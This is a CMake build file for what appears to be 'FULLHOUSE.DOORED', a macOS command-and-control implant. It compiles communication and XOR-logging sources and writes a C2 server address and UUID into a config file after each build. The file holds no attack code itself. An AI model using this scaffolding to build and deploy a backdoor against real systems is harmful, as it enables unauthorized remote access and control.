add_executable(
    main
    main.cpp
    base64.cpp
    core.mm
    comms.cpp
    XorLogger.cpp
    settings.cpp
)

target_link_libraries(
    main
    "-framework Foundation"
)


# FULLHOUSE.DOORED config definitions
target_compile_definitions(
    main PRIVATE
    CONFIG_FILE_NAME_CMAKE="${CONFIG_FILE_NAME_CMAKE}"
    $<$<CONFIG:Debug>:DEBUG>
)

add_custom_command(
    TARGET main POST_BUILD
    COMMAND echo ${C2_ADDRESS_CMAKE} > ${CMAKE_SOURCE_DIR}/src/config
    COMMAND echo ${UUID_CMAKE} >> ${CMAKE_SOURCE_DIR}/src/config
    COMMAND truncate
    ARGS -s -1 ${CMAKE_SOURCE_DIR}/src/config
    VERBATIM
)
